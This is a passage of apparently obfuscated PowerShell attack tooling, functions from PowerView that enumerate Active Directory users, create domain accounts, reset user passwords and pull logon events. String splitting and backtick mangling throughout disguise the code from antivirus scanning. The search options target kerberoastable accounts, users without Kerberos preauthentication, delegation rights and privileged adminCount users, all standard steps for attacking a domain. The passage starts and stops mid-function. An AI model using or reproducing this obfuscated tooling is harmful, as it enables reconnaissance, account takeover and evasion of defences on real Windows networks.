        [ValidateSet({"{0}{1}"-f 'Bas','e'}, {"{2}{1}{0}"-f 'vel','Le','One'}, {"{2}{0}{1}" -f 're','e','Subt'})]
        [String]
        ${SE`ARch`s`coPe} = ("{1}{0}"-f 'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reS`UlTpaGE`SIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERv`E`RTImel`iMIt},

        [ValidateSet({"{1}{0}" -f 'acl','D'}, {"{0}{1}" -f 'G','roup'}, {"{0}{1}" -f 'No','ne'}, {"{1}{0}"-f 'r','Owne'}, {"{1}{0}"-f'l','Sac'})]
        [String]
        ${S`ec`URItY`MAskS},

        [Switch]
        ${tOmbs`T`ONe},

        [Alias({"{0}{1}{2}" -f 'Re','tu','rnOne'})]
        [Switch]
        ${Fin`DO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CReDe`N`TIAl} =  (VAriAblE  ("{0}{1}"-f 'qf','N') )."v`AluE"::"e`mpTY",

        [Switch]
        ${R`Aw}
    )

    DynamicParam {
        ${UaC`V`Al`UEn`Ames} =   (GET-VaRiaBlE  ("{1}{0}" -f'S5','MN') -valuEO  )::("{1}{0}{2}" -f'me','GetNa','s').Invoke(${ua`CEnUM})
        
        ${uaCVa`LUE`N`Ames} = ${UA`c`Va`lue`NAmes} | &("{2}{3}{1}{4}{0}"-f't','ch-Ob','Fo','rEa','jec') {${_}; "NOT_$_"}
        
        &("{4}{1}{2}{3}{0}{5}"-f'icParame','w','-Dyna','m','Ne','ter') -Name ("{2}{3}{1}{0}" -f 'er','t','UA','CFil') -ValidateSet ${U`ACV`ALu`eNamEs} -Type ([array])
    }

    BEGIN {
        ${sE`ARchEraRGU`Me`Nts} = @{}
        if (${P`SBou`N`dParAmETe`Rs}[("{0}{1}"-f'Doma','in')]) { ${S`eARche`R`ARg`Um`enTs}[("{1}{0}" -f'n','Domai')] = ${d`oMA`In} }
        if (${psB`ound`pa`Ra`METErs}[("{1}{0}{2}" -f'rop','P','erties')]) { ${Se`ArC`He`RaRGUMenTs}[("{1}{2}{0}" -f'ties','Pr','oper')] = ${PR`oPe`R`TIES} }
        if (${PSBoU`NdpaR`A`met`eRs}[("{2}{0}{1}" -f'rc','hBase','Sea')]) { ${SeArcher`ARg`U`meNTs}[("{2}{0}{1}"-f 'chBa','se','Sear')] = ${sEaRC`h`BaSE} }
        if (${P`S`B`oUNdP`ARAmEterS}[("{1}{0}" -f'er','Serv')]) { ${sea`RCHeRarg`U`MenTs}[("{0}{1}"-f 'S','erver')] = ${sE`RvEr} }
        if (${p`SBO`UNDParA`MetERs}[("{2}{0}{1}" -f'arch','Scope','Se')]) { ${s`eArC`HeRA`R`GU`Ments}[("{2}{1}{0}" -f 'e','chScop','Sear')] = ${S`ea`RChSC`opE} }
        if (${pSB`Oundp`ArameT`e`RS}[("{2}{0}{1}"-f 'lt','PageSize','Resu')]) { ${SeAr`Ch`eRar`g`UMEnTs}[("{1}{0}{2}"-f'i','ResultPageS','ze')] = ${REsUL`Tpa`G`ESI`Ze} }
        if (${pSb`oUNd`p`ArAmE`Te`RS}[("{0}{1}{2}{3}"-f 'Serv','erTimeL','im','it')]) { ${Se`Arc`hERAR`gU`MEnTS}[("{1}{0}{3}{2}" -f'rverT','Se','Limit','ime')] = ${SeRV`E`R`TIMeLiMIt} }
        if (${pSbouNdPaR`AME`Te`RS}[("{1}{0}{3}{2}" -f 'e','S','ks','curityMas')]) { ${sE`A`RC`HeRaRGume`N`TS}[("{2}{0}{1}{3}{4}" -f'c','urityMa','Se','sk','s')] = ${SeCURiT`y`mas`kS} }
        if (${pSb`OuND`PaR`AM`EtErS}[("{0}{2}{1}{3}"-f'Tom','n','bsto','e')]) { ${SEARC`HERArGu`ME`N`TS}[("{1}{2}{0}"-f'e','Tom','bston')] = ${t`oMBSTo`NE} }
        if (${psbo`UNdPaR`A`mETERS}[("{1}{3}{0}{2}" -f 'i','Creden','al','t')]) { ${sEa`Rc`herARG`U`meNts}[("{0}{1}{2}" -f'Crede','n','tial')] = ${Cr`EDe`N`TIaL} }
        ${use`RSEAr`ch`ER} = &("{3}{1}{0}{2}"-f'nSearch','t-Domai','er','Ge') @SearcherArguments
    }

    PROCESS {
        
        if (${Ps`BOUndP`ARAmETe`Rs} -and (${P`Sbo`UNDPAR`AmEtE`RS}."Cou`Nt" -ne 0)) {
            &("{3}{4}{2}{1}{0}"-f'r','cParamete','nami','New-','Dy') -CreateVariables -BoundParameters ${pSb`OU`NDpARAme`TERS}
        }

        if (${usErSe`ArC`h`eR}) {
            ${ide`N`Tit`yFIlt`Er} = ''
            ${f`i`LTeR} = ''
            ${Ide`NT`ItY} | &("{0}{1}{2}" -f'Where-Ob','jec','t') {${_}} | &("{1}{0}{2}" -f'orEa','F','ch-Object') {
                ${Id`E`NTIt`Y`INstANCe} = ${_}.("{2}{1}{0}"-f'ce','pla','Re').Invoke('(', '\28').("{2}{1}{0}" -f'ace','epl','R').Invoke(')', '\29')
                if (${I`DEn`TityiN`sTa`NCE} -match ("{0}{1}"-f'^S-1','-')) {
                    ${id`E`NTitYfILTER} += "(objectsid=$IdentityInstance)"
                }
                elseif (${i`d`EntItyInsT`ANcE} -match ("{0}{1}"-f '^','CN=')) {
                    ${IDEnt`itYFi`L`Ter} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${Psb`oU`Nd`PARa`metERs}[("{0}{1}" -f'Dom','ain')]) -and (-not ${psBoun`dpaRamet`e`Rs}[("{2}{0}{1}" -f 'rc','hBase','Sea')])) {
                        
                        
                        ${Ide`Nt`iTYD`OMaIn} = ${idEn`T`IT`yIn`stAnCe}.("{1}{0}"-f 'tring','SubS').Invoke(${IDEn`TI`TyinstA`NCE}.("{1}{0}" -f'ndexOf','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{3}{0}{2}{4}"-f'e','Writ','rbos','e-V','e') ('[Get'+'-Do'+'m'+'ainUs'+'er]'+' '+'Extr'+'ac'+'ted '+'domai'+'n '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        ${S`ea`RChe`RARg`UmEnts}[("{1}{0}"-f 'omain','D')] = ${ide`NTiTyDo`M`AiN}
                        ${us`ErSEAR`CHeR} = &("{2}{0}{1}{3}"-f'-Doma','inS','Get','earcher') @SearcherArguments
                        if (-not ${uSeR`s`eA`R`chEr}) {
                            &("{1}{3}{2}{0}" -f'ing','Wr','n','ite-War') ('[Get-Do'+'main'+'U'+'se'+'r]'+' '+'Una'+'ble '+'to'+' '+'ret'+'ri'+'eve '+'d'+'om'+'ain '+'se'+'ar'+'ch'+'er '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${I`DENti`TY`iNstaNCe} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${Guid`BYteS`T`R`ING} = (([Guid]${I`d`EN`TITYI`N`sTanCE}).("{2}{3}{1}{0}"-f 'rray','A','ToByt','e').Invoke() | &("{2}{1}{0}{3}"-f 'ch-Ob','Ea','For','ject') { '\' + ${_}.("{1}{0}{2}"-f 'n','ToStri','g').Invoke('X2') }) -join ''
                    ${idE`NTity`FiltER} += "(objectguid=$GuidByteString)"
                }
                elseif (${ide`Nt`iTyInst`A`N`Ce}.("{1}{0}"-f 'ntains','Co').Invoke('\')) {
                    ${COnve`RTE`D`IdenTiTyI`Nst`Ance} = ${Ident`I`Tyi`NsTA`Nce}.("{1}{0}" -f 'ace','Repl').Invoke('\28', '(').("{1}{2}{0}" -f 'ce','Rep','la').Invoke('\29', ')') | &("{2}{0}{1}"-f'on','vert-ADName','C') -OutputType ("{1}{2}{0}" -f 'onical','C','an')
                    if (${c`ON`VErTe`DId`eNTIt`yINSTa`Nce}) {
                        ${Us`ERd`o`MAIN} = ${c`oNV`ERTEDid`eNTity`inSTaNCe}.("{1}{0}{2}{3}"-f 'St','Sub','r','ing').Invoke(0, ${C`on`VERTEdId`EnTIt`YI`NsT`ANCe}.("{1}{0}" -f'Of','Index').Invoke('/'))
                        ${Us`ER`Name} = ${I`DEN`T`I`TyInst`Ance}.("{1}{0}"-f't','Spli').Invoke('\')[1]
                        ${I`DeN`TiTyFiLter} += "(samAccountName=$UserName)"
                        ${SEaRchErArG`U`Me`NTs}[("{0}{1}"-f'Doma','in')] = ${UseR`d`OMA`In}
                        &("{1}{3}{2}{0}"-f'ose','W','Verb','rite-') ('[Get'+'-'+'Domain'+'User'+'] '+'Ex'+'tracte'+'d '+'doma'+'in'+' '+"'$UserDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${uS`e`RsEA`RcHER} = &("{1}{2}{0}{3}"-f 'm','Get-D','o','ainSearcher') @SearcherArguments
                    }
                }
                else {
                    ${Id`En`TiT`yFIlT`ER} += "(samAccountName=$IdentityInstance)"
                }
            }

            if (${I`dENTityfi`ltEr} -and (${i`D`eNTITYFILT`er}.("{0}{1}" -f 'Tri','m').Invoke() -ne '') ) {
                ${F`IL`Ter} += "(|$IdentityFilter)"
            }

            if (${p`sBOuNDPArA`mET`Ers}['SPN']) {
                &("{0}{1}{2}"-f'Write','-Ve','rbose') ("{4}{12}{10}{8}{1}{3}{2}{7}{5}{9}{11}{6}{0}" -f 'ames','n',' s','on-null','[Get-DomainUser] S','i','pal n','erv',' for ','ce pri','hing','nci','earc')
                ${fI`L`TeR} += ("{3}{2}{0}{4}{6}{1}{5}"-f 'er','ame=','s','(','vicePrincipal','*)','N')
            }
            if (${P`sBou`NDP`A`RaMEtERs}[("{1}{2}{3}{0}" -f 'tion','All','owDe','lega')]) {
                &("{3}{0}{2}{1}" -f't','Verbose','e-','Wri') ("{8}{5}{2}{1}{6}{4}{0}{7}{3}{9}" -f'or user','omai','t-D','n',' Searching f','Ge','nUser]','s who ca','[',' be delegated')
                
                ${fiL`TER} += ((("{5}{3}{1}{6}{0}{9}{8}{4}{7}{2}"-f '0.11355','Co','48574))','!(userAccount','803','(','ntrol:1.2.84',':=10','.','6.1.4')))
            }
            if (${p`sb`OUNd`PArA`mE`TeRS}[("{0}{1}{2}{3}" -f'Disallo','wD','elegatio','n')]) {
                &("{0}{2}{3}{1}"-f'Wri','e','te-','Verbos') ("{6}{11}{10}{8}{2}{14}{1}{15}{3}{13}{4}{0}{9}{5}{12}{7}"-f's',' use','hing ','ho ar',' tru','d f','[Get-',' delegation','rc','te','omainUser] Sea','D','or','e sensitive and not','for','rs w')
                ${fIl`TEr} += ("{3}{0}{6}{1}{7}{4}{8}{2}{5}"-f 'AccountCon',':1.2.84','803:','(user','.113556.1.4','=1048574)','trol','0','.')
            }
            if (${PSBO`UND`Pa`R`AM`eTeRS}[("{0}{2}{1}" -f 'A','inCount','dm')]) {
                &("{4}{3}{2}{0}{1}"-f 'e','-Verbose','it','r','W') ("{3}{5}{9}{4}{2}{7}{8}{0}{6}{1}"-f'for adminCo','1','nUser] Search','[Get-','i','Dom','unt=','in','g ','a')
                ${FIl`Ter} += ("{1}{0}{3}{2}" -f'n','(admincou',')','t=1')
            }
            if (${pSBouND`paR`A`mEtErs}[("{0}{1}{2}" -f'TrustedT','oA','uth')]) {
                &("{1}{2}{0}{3}"-f's','Wr','ite-Verbo','e') ("{14}{1}{16}{4}{11}{13}{5}{10}{7}{0}{17}{20}{18}{9}{19}{3}{21}{6}{12}{2}{8}{15}{22}"-f 'that ','et-D','er ','o','ai',' user',' ',' ','pr',' ','s','nUser]','oth',' Searching for','[G','incipal','om','are trusted to','te','f',' authentica','r','s')
                ${F`Ilt`Er} += (("{4}{3}{5}{2}{1}{0}" -f 'teto=*)','delega','llowedto','d','(ms','s-a'))
            }
            if (${P`sBoUnDpaR`AM`et`ERs}[("{1}{0}{4}{2}{3}"-f 'ut','Prea','R','equired','hNot')]) {
                &("{3}{0}{1}{2}" -f'rite','-V','erbose','W') ("{17}{7}{22}{15}{20}{5}{12}{9}{8}{2}{4}{1}{21}{18}{14}{13}{10}{0}{6}{11}{19}{3}{16}"-f'rbe','s that','n','enticat','t',']','ros','t','cou',' ac','e',' p',' Searching for user','re k',' requi','o','e','[Ge','t','reauth','mainUser',' do no','-D')
                ${fI`l`Ter} += (("{8}{5}{3}{6}{11}{10}{9}{2}{0}{1}{7}{4}" -f'.803:','=419','.4','ount','04)','erAcc','Co','43','(us','56.1','ol:1.2.840.1135','ntr'))
            }
            if (${p`sb`oU`NDP`ArameTeRs}[("{1}{0}{3}{2}"-f 'Fil','LDAP','r','te')]) {
                &("{1}{0}{2}" -f'b','Write-Ver','ose') ('[G'+'et-D'+'o'+'mainUs'+'er]'+' '+'U'+'si'+'ng '+'a'+'dd'+'ition'+'al '+'LD'+'AP '+'filter'+': '+"$LDAPFilter")
                ${FIL`Ter} += "$LDAPFilter"
            }

            
            ${U`AC`FiltER} | &("{1}{2}{0}"-f'ect','W','here-Obj') {${_}} | &("{1}{0}{3}{2}"-f'-','ForEach','ct','Obje') {
                if (${_} -match ("{0}{1}"-f'NO','T_.*')) {
                    ${U`ACFi`ELD} = ${_}.("{2}{0}{3}{1}"-f'bst','ing','Su','r').Invoke(4)
                    ${uaC`VA`l`Ue} = [Int](${ua`ceNuM}::${u`AcFiE`Ld})
                    ${FIL`TeR} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${UA`CV`AluE} = [Int](${Ua`CEn`UM}::${_})
                    ${fI`lTEr} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${U`seRSEA`RcH`eR}."Fil`TeR" = "(&(samAccountType=805306368)$Filter)"
            &("{1}{2}{0}"-f'ose','W','rite-Verb') "[Get-DomainUser] filter string: $($UserSearcher.filter) "

            if (${psbOUND`pa`RaM`etErs}[("{0}{1}{2}" -f'FindO','n','e')]) { ${r`eSu`lTs} = ${U`ser`s`EArchER}.("{0}{2}{1}" -f 'Fin','ne','dO').Invoke() }
            else { ${Re`s`Ults} = ${uSeR`s`EaRc`her}.("{2}{1}{0}" -f 'll','indA','F').Invoke() }
            ${rE`sULts} | &("{1}{0}{3}{2}"-f 'r','Whe','ject','e-Ob') {${_}} | &("{2}{3}{0}{1}"-f 'h-Objec','t','ForE','ac') {
                if (${PSboU`N`d`parAMeTErS}['Raw']) {
                    
                    ${Us`er} = ${_}
                    ${U`seR}."PSO`BJe`cT"."t`y`pENam`eS".("{2}{0}{1}"-f'ser','t','In').Invoke(0, ("{3}{0}{5}{2}{4}{1}" -f 'iew.U','w','r.','PowerV','Ra','se'))
                }
                else {
                    ${u`SER} = &("{0}{2}{1}{6}{4}{3}{5}"-f'Conve','-LDA','rt','t','oper','y','PPr') -Properties ${_}."P`R`OpertIES"
                    ${us`Er}."ps`OBjecT"."tyP`E`NAmes".("{1}{0}"-f'rt','Inse').Invoke(0, ("{2}{3}{1}{0}" -f 'r','Use','Power','View.'))
                }
                ${u`Ser}
            }
            if (${Re`SuLTs}) {
                try { ${reSU`L`TS}.("{0}{1}{2}" -f'd','isp','ose').Invoke() }
                catch {
                    &("{1}{2}{3}{0}"-f'rbose','W','rite','-Ve') ('['+'Get-Do'+'ma'+'in'+'Use'+'r] '+'E'+'rror '+'di'+'spos'+'ing '+'o'+'f '+'t'+'he '+'R'+'e'+'sults '+'ob'+'j'+'ect: '+"$_")
                }
            }
            ${uSE`R`sEArC`H`eR}.("{0}{1}{2}"-f 'dispo','s','e').Invoke()
        }
    }
}


function neW`-d`oMa`INU`sER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{9}{8}{0}{4}{5}{10}{3}{7}{2}{6}{1}{11}" -f'ld','i','c','ngin','Pr','ocessFor','t','gFun','u','PSUseSho','StateCha','ons'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}" -f 'oce','P','SShouldPr','ss'}, '')]
    [OutputType({"{6}{9}{3}{8}{2}{7}{1}{4}{5}{0}{10}" -f'.UserPrincip','M','s.Acco','ctoryS','anage','ment','Di','unt','ervice','re','al'})]
    Param(
        [Parameter(MandaTory = ${TR`Ue})]
        [ValidateLength(0, 256)]
        [String]
        ${S`A`M`AcCounT`NAme},

        [Parameter(Mandatory = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'rd','Passw','o'})]
        [Security.SecureString]
        ${aC`c`oUnTpASs`W`OrD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Na`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dI`SP`LA`Yname},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`eS`cRIPt`Ion},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`MAIn},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cred`En`TiAl} =   (VaRIabLe  ("qF"+"N") -ValueOnl  )::"E`MPTy"
    )

    ${cont`ex`TaRgUMe`NTs} = @{
        ("{2}{1}{0}" -f'y','tit','Iden') = ${saMACcoU`N`Tn`A`ME}
    }
    if (${Psbo`UNDp`A`RameTe`RS}[("{0}{1}"-f 'Do','main')]) { ${C`ONtE`Xt`AR`GUMenTs}[("{2}{0}{1}"-f'a','in','Dom')] = ${D`OmaiN} }
    if (${Ps`BO`Un`Dpar`AMetE`RS}[("{1}{2}{0}"-f'ntial','Cr','ede')]) { ${cOnT`eXtarg`UmeN`Ts}[("{0}{2}{1}" -f 'C','ntial','rede')] = ${C`ReDen`TIAL} }
    ${COnTe`xt} = &("{0}{2}{4}{1}{3}" -f'Get','cipalConte','-Pri','xt','n') @ContextArguments

    if (${c`oN`TeXT}) {
        ${US`ER} = &("{1}{2}{0}"-f'-Object','Ne','w') -TypeName ("{4}{0}{3}{6}{9}{8}{10}{7}{1}{2}{5}" -f 'stem.','s','er','Dir','Sy','Principal','ectoryService','ement.U','AccountM','s.','anag') -ArgumentList (${c`oNtext}."CoN`TeXT")

        
        ${u`SER}."samaCCO`Unt`Na`Me" = ${C`oN`TeXt}."ID`enT`itY"
        ${te`mPCR`Ed} = &("{2}{1}{0}" -f 'bject','O','New-') ("{0}{10}{2}{1}{5}{6}{7}{8}{3}{11}{9}{4}" -f'S','ment','e','io','dential','.A','uto','m','at','re','ystem.Manag','n.PSC')('a', ${aCc`O`Un`TpaSswO`Rd})
        ${u`ser}.("{3}{0}{2}{1}"-f'Passw','d','or','Set').Invoke(${Te`mPcR`ED}.("{2}{1}{3}{4}{0}" -f 'ial','r','GetNetwo','kCre','dent').Invoke()."p`AsS`WOrD")
        ${u`seR}."Enab`lED" = ${t`Rue}
        ${U`SeR}."pAs`SW`oRD`NOtR`equi`RED" = ${fAl`Se}

        if (${PSboU`ND`PA`RAmEte`RS}[("{0}{1}"-f'Nam','e')]) {
            ${us`er}."NA`mE" = ${na`me}
        }
        else {
            ${us`ER}."NA`Me" = ${Co`NTe`Xt}."IDENTi`Ty"
        }
        if (${pSb`Ou`Nd`pA`RaMETeRs}[("{1}{0}{2}" -f'i','D','splayName')]) {
            ${US`eR}."DIS`PLAy`NAmE" = ${DI`sp`lay`NaMe}
        }
        else {
            ${u`SER}."d`iSpL`AYnAmE" = ${CO`NteXt}."I`D`eNtITy"
        }

        if (${P`sboundP`A`R`AmeTE`Rs}[("{0}{1}{2}{3}" -f'De','sc','r','iption')]) {
            ${Us`ER}."dEscr`ip`Tion" = ${desCRi`P`TioN}
        }

        &("{3}{1}{2}{0}"-f 'erbose','rite','-V','W') ('[New-Dom'+'a'+'i'+'nUse'+'r] '+'A'+'ttemp'+'ting'+' '+'to'+' '+'creat'+'e '+'use'+'r '+"'$SamAccountName'")
        try {
            ${nU`lL} = ${US`eR}.("{1}{0}"-f'ave','S').Invoke()
            &("{1}{0}{3}{2}" -f 't','Wri','-Verbose','e') ('['+'Ne'+'w-DomainUse'+'r] '+'User'+' '+"'$SamAccountName' "+'s'+'uccessfu'+'lly '+'cr'+'eate'+'d')
            ${us`Er}
        }
        catch {
            &("{0}{2}{3}{1}" -f'Write-','g','W','arnin') ('['+'New-'+'Doma'+'inUser] '+'E'+'rro'+'r '+'cre'+'ating'+' '+'user'+' '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function SET`-d`o`MAINuSerpAs`S`wo`Rd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{3}{1}{8}{7}{4}{2}{9}{6}{10}{12}{11}{0}" -f'ns','Pr','ateChan','UseShould','rSt','PS','ng','cessFo','o','gi','Fun','io','ct'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}"-f 'P','Pr','SShould','ocess'}, '')]
    [OutputType({"{6}{1}{5}{2}{3}{8}{4}{0}{7}"-f 'ent.UserPrinc','es','Accou','nt','gem','.','DirectoryServic','ipal','Mana'})]
    Param(
        [Parameter(posITiOn = 0, MandatOrY = ${t`RUE})]
        [Alias({"{2}{0}{1}"-f'erNam','e','Us'}, {"{0}{1}{2}{3}" -f 'U','serId','entit','y'}, {"{1}{0}"-f'ser','U'})]
        [String]
        ${I`d`Ent`ity},

        [Parameter(ManDaTOry = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'sword','P','as'})]
        [Security.SecureString]
        ${aCco`UN`TPa`SS`WoRd},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`O`maIn},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eDEnTi`AL} =  ( GET-VaRIAbLE ('qF'+'n') )."Va`LUe"::"EMp`Ty"
    )

    ${CoNtExT`AR`gu`me`Nts} = @{ ("{0}{1}"-f 'Id','entity') = ${i`DENtITy} }
    if (${psBOun`dpara`mEt`ERs}[("{1}{2}{0}"-f 'ain','D','om')]) { ${cO`N`TEX`TARgUMenTs}[("{0}{1}" -f'D','omain')] = ${dom`A`In} }
    if (${Psb`ouNdpAR`AMeTE`Rs}[("{0}{1}{2}"-f 'Cred','entia','l')]) { ${C`oNT`Ex`TArgu`MENtS}[("{1}{3}{2}{0}" -f 'al','Cred','i','ent')] = ${CR`e`dentIaL} }
    ${c`oNte`XT} = &("{3}{0}{1}{2}" -f'c','ipalContex','t','Get-Prin') @ContextArguments

    if (${CO`NtE`xt}) {
        ${us`Er} = [System.DirectoryServices.AccountManagement.UserPrincipal]::("{0}{3}{2}{1}" -f 'Fin','y','yIdentit','dB').Invoke(${CO`NT`Ext}."C`ON`TExt", ${IdeN`TI`TY})

        if (${US`er}) {
            &("{0}{2}{3}{1}"-f'W','e','rite-V','erbos') ('[Set-Domai'+'n'+'U'+'serPa'+'sswo'+'r'+'d'+'] '+'Attempt'+'in'+'g '+'t'+'o '+'set'+' '+'t'+'he '+'pa'+'ssword '+'f'+'or '+'use'+'r '+"'$Identity'")
            try {
                ${t`eMp`CReD} = &("{1}{2}{0}"-f 'ct','New-O','bje') ("{2}{1}{0}{7}{6}{3}{5}{4}"-f'anagem','m.M','Syste','re','tial','den','on.PSC','ent.Automati')('a', ${A`ccounTP`A`S`SW`ord})
                ${us`ER}.("{2}{0}{1}{3}" -f 'tPas','swo','Se','rd').Invoke(${tem`pCred}.("{2}{0}{4}{1}{3}"-f 'rk','rede','GetNetwo','ntial','C').Invoke()."pA`SSW`ORD")

                ${NU`lL} = ${u`seR}.("{0}{1}"-f'Sav','e').Invoke()
                &("{4}{3}{0}{1}{2}" -f 'ite-V','er','bose','r','W') ('['+'Set-D'+'omainUserPassw'+'ord'+'] '+'Passw'+'o'+'rd '+'for'+' '+'u'+'ser '+"'$Identity' "+'succ'+'es'+'s'+'fully '+'re'+'set')
            }
            catch {
                &("{3}{2}{0}{1}" -f 'e','-Warning','t','Wri') ('[Set-'+'Domai'+'nUserPa'+'s'+'sword] '+'Err'+'or '+'settin'+'g '+'passw'+'o'+'rd '+'f'+'or '+'use'+'r '+"'$Identity' "+': '+"$_")
            }
        }
        else {
            &("{3}{1}{2}{0}"-f'arning','e','-W','Writ') ('[S'+'e'+'t-D'+'omai'+'nUserPassword] '+'U'+'n'+'able '+'t'+'o '+'fin'+'d '+'use'+'r '+"'$Identity'")
        }
    }
}


function gE`T`-d`omAiNUSERe`V`enT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}"-f 'PSShou','ro','ldP','cess'}, '')]
    [OutputType({"{3}{1}{5}{2}{4}{0}"-f'nEvent','rVi','w.L','Powe','ogo','e'})]
    [OutputType({"{6}{3}{11}{10}{8}{1}{2}{9}{5}{0}{4}{7}"-f 'gonEv','itC','r','o','en','dentialLo','P','t','plic','e','iew.Ex','werV'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItion = 0, vaLuEfroMPIPeLine = ${TR`UE}, ValuEFROmpIpeLInEByPrOpErtynaMe = ${t`RUe})]
        [Alias({"{1}{0}{2}"-f 'os','dnsh','tname'}, {"{2}{1}{0}" -f 'me','stNa','Ho'}, {"{0}{1}" -f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CO`mPU`TEr`NAmE} = ${EnV`:COM`pUtE`RnaMe},

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${s`TAR`TTIMe} =  ${J`1L`Gm}::"n`Ow".("{2}{0}{1}"-f'D','ays','Add').Invoke(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${ENDT`I`mE} =   (Get-VaRIAble  ("J1"+"LgM")  )."va`Lue"::"n`Ow",

        [ValidateRange(1, 1000000)]
        [Int]
        ${m`AX`e`VeNts} = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrE`deN`TiaL} =  ( Get-cHilDitEM  ("vAR"+"IABLE:"+"q"+"fN")  )."Va`Lue"::"eMp`Ty"
    )

    BEGIN {
        
        ${x`Pathfi`Lt`ER} = ((('i'+'VN
<Que'+'ryList'+'>
 ') -CRePlAce'iVN',[cHAR]34)+' '+' '+' '+'<Que'+'ry '+('Id='+'Vu'+'i0Vui ')."r`EplA`Ce"('Vui',[STRiNG][CHAR]34)+(('Pat'+'h=q'+'Rc'+'S'+'ecurit'+'y'+'qRc>

 ')  -rEPlacE ([ChaR]113+[ChaR]82+[ChaR]99),[ChaR]34)+' '+' '+' '+' '+' '+' '+' '+'<!--'+' '+'Lo'+'g'+'on '+'e'+'vent'+'s '+'-->
'+' '+' '+' '+' '+' '+' '+' '+' '+'<Sel'+'ect '+(('Path=nj6Sec'+'u'+'ritynj'+'6'+'>'+'
 ') -repLACe([cHaR]110+[cHaR]106+[cHaR]54),[cHaR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'yste'+'m[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pr'+'ov'+'i'+'der[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@Name=e'+'CFMicrosoft'+'-'+'W'+'in'+'dows-Se'+'c'+'u'+'ri'+'ty-'+'Audit'+'ing'+'eCF
'+' ') -cRePlacE  'eCF',[CHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+' '+'(Lev'+'el='+'4 '+'or'+' '+'Level=0'+') '+'an'+'d '+'(EventID=46'+'2'+'4)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd '+'Tim'+'eCre'+'ated['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@SystemT'+'ime&g'+'t'+';'+'={'+'0}'+'{1}({1}St'+'art'+'Tim'+'e.ToUniversa'+'lT'+'ime().'+'ToStr'+'ing({0}s'+'{0})){0} ')  -F [chaR]39,[chaR]36+'and'+' '+('@Sy'+'stemTime&lt'+';'+'={1}{'+'0}('+'{0}E'+'ndT'+'im'+'e.T'+'oUniv'+'e'+'rsalTime().'+'T'+'o'+'Strin'+'g({1}s{1'+'}'+'))'+'{1}
 ')-f [chaR]36,[chaR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('*['+'Even'+'tData'+'[Data'+'[@Na'+'me={0}Ta'+'rg'+'e'+'tU'+'serName'+'{0}'+']'+' ')  -f [chAR]39+'!'+'= '+('yx5A'+'N'+'ONYMOUS'+' ')."r`E`plACe"(([ChAr]121+[ChAr]120+[ChAr]53),[string][ChAr]39)+('LO'+'G'+'ONkCy]'+']
 ')."rE`Place"('kCy',[strINg][chAr]39)+' '+' '+' '+' '+' '+' '+' '+'</Se'+'lect>

'+' '+' '+' '+' '+' '+' '+' '+' '+'<!'+'-- '+'L'+'ogon '+'with'+' '+'ex'+'pli'+'cit '+'cre'+'d'+'ent'+'ial '+'e'+'vent'+'s '+'-->
